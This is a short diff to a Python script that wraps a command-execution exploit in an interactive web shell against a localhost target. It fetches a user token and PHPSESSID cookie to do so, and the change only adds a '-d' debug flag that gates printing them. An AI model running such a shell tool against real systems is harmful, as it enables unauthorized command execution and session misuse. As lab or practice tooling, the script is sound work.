@@ -4,6 +4,7 @@ from webshellify import Webshellify
 import requests as req
 import re
 import urllib
+import sys
 
 HOST = "localhost"
 PORT = 80
@@ -14,7 +15,7 @@ requires a valid, authorized PHPSSID cookie to be passed into it (either hard
 coded or programatically fetched)
 """
 def main():
-    shell = Webshellify(exploit, debug=False)
+    shell = Webshellify(exploit, debug='-d' in sys.argv)
     shell.create_shell(urlencode=False)
 
 def exploit(cmd):
@@ -39,8 +40,9 @@ def get_session():
     user_token = user_token_regex.findall(resp.text)[0]
     sess_cookie = resp.cookies.get("PHPSESSID")
 
-    print(f"[info] aquired token: {user_token}")
-    print(f"[info] aquired cookie: {sess_cookie}")
+    if "-d" in sys.argv:
+        print(f"[info] aquired token: {user_token}")
+        print(f"[info] aquired cookie: {sess_cookie}")
 
     resp2 = req.request(
         "POST",
